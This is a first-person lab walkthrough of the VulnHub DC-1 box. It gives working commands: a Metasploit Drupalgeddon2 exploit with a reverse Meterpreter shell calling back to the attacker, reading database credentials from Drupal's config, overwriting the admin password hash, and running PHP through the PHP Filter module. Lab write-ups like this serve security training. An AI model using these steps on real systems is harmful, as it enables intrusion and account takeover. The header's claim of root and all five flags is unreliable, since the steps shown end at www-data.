# DC-1 (VulnHub) — My Walkthrough

**Target:** 10.0.2.4 | **Attacker:** Kali, 10.0.2.6 | **Result:** Root, all 5 flags

This was my first box in the DC series. Here's how I worked through it, command by command, and why I made the calls I did.

---

## 1. Finding the box

Since my lab runs on a NAT Network with DHCP, IPs shift between reboots, so the first thing I always do is a ping sweep to see what's actually alive before I waste time on a stale IP:

```bash
sudo nmap -sn 10.0.2.0/24
```

`-sn` just does host discovery, no ports — I don't need port info yet, I just need to know DC-1 is at `.4` today.

## 2. What's actually running

```bash
nmap -sV 10.0.2.4
```

This gave me SSH (OpenSSH 6.0p1 Debian), HTTP (Apache 2.2.22 Debian), and RPC on 111. Apache + Debian is a classic Drupal pairing in these VulnHub boxes, so that was my next guess to confirm.

## 3. Confirming it's Drupal

```bash
curl -s http://10.0.2.4/ | grep -i generator
```

I tried `CHANGELOG.txt` first out of habit but it 404'd, so I fell back on grepping the page source for Drupal's `<meta name="Generator">` tag instead — that confirmed Drupal 7 for me.

## 4. Going in with Drupalgeddon2

Drupal 7 immediately made me think of CVE-2018-7600 — Drupalgeddon2 — since it's such a well-known unauthenticated RCE for this exact version range. I fired up Metasploit:

```bash
msfconsole -q
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.0.2.4
set RPORT 80
set TARGETURI /
set PAYLOAD php/meterpreter/reverse_tcp
set LHOST 10.0.2.6
run
```

I set the payload to a PHP Meterpreter specifically because the exploit runs through the web server — needs to be PHP-based to actually execute in that context. `LHOST` is my Kali box, not the target, which trips people up sometimes if they're new to this.

This landed me a Meterpreter session as `www-data`.

## 5. Getting a shell I can actually work in

```bash
shell
python -c 'import pty; pty.spawn("/bin/bash")'
```

The raw shell from Meterpreter's `shell` command is annoying to work with — no job control, weird behavior on things like `mysql` or `su`. Spawning a proper PTY with Python fixes that. Worth noting DC-1 only has Python 2, so `python3` won't work here.

## 6. Hunting for flags

```bash
find / -iname "flag*" 2>/dev/null
```

This turned up `/var/www/flag1.txt` and `/home/flag4/flag4.txt` right away. Reading Flag 1 pointed me toward Drupal's config file next.

## 7. Getting DB creds from Drupal's config (Flag 2)

```bash
cat /var/www/sites/default/settings.php
```

Drupal stores its DB credentials in cleartext in this file — `dbuser` / `R0ck3t` / database `drupaldb`. Flag 2 was actually sitting in this same file as a comment, basically telling me "use these creds, don't bother cracking anything."

## 8. Looking at the users table

```bash
mysql -u dbuser -pR0ck3t drupaldb -e 'select uid, name, pass from users;'
```

Found `admin` (uid 1) and `Fred` (uid 2), both with salted Drupal 7 hashes. Cracking those directly wasn't realistic, so I took a different approach.

## 9. Generating my own password hash

```bash
cd /var/www
php scripts/password-hash.sh newpass123
```

Instead of cracking admin's hash, I used Drupal's own hashing script to generate a valid hash for a password *I* chose. Had to run this from the webroot so its relative includes would resolve properly.

## 10. Overwriting admin's password

```bash
mysql -u dbuser -pR0ck3t drupaldb -e 'update users set pass="<generated-hash>" where uid=1;'
```

Just wrote my new hash straight into the `pass` column for uid=1. Admin's password is now `newpass123` and I never had to crack the original.

## 11. Logging in

Went to `http://10.0.2.4/user/login` in the browser and logged in as `admin` / `newpass123`.

## 12. Getting code execution through PHP Filter

Once I was in as admin:
1. Modules → enabled PHP Filter → saved
2. Add content → Basic page
3. Set the body's text format to PHP code
4. Dropped in:
```php
<?php system('id'); ?>
```
5. Saved and viewed the page

Drupal 7's PHP Filter module runs any saved content as raw PHP — since I was logged in as admin, that gave me code execution as `www-data` right through the normal web interface, no separate exploit needed for this part.

---

## Quick Reference

| Step | Command | What it did |
|---|---|---|
| 1 | `sudo nmap -sn 10.0.2.0/24` | Found the target IP |
| 2 | `nmap -sV <ip>` | Service/version scan |
| 3 | `curl -s http://<ip>/ \| grep -i generator` | Confirmed Drupal |
| 4 | `use exploit/unix/webapp/drupal_drupalgeddon2` | Exploited CVE-2018-7600 |
| 5 | `shell` → `python -c 'import pty; pty.spawn("/bin/bash")'` | Stabilized my shell |
| 6 | `find / -iname "flag*" 2>/dev/null` | Located the flags |
| 7 | `cat sites/default/settings.php` | Got DB creds + Flag 2 |
| 8 | `mysql -u dbuser -p... -e 'select ...'` | Read the users table |
| 9 | `php scripts/password-hash.sh <pass>` | Made my own valid hash |
| 10 | `mysql -u dbuser -p... -e 'update users set pass=...'` | Overwrote admin's password |
| 11 | Browser login | Got into the Drupal admin panel |
| 12 | Enabled PHP Filter + payload | Code execution as www-data |
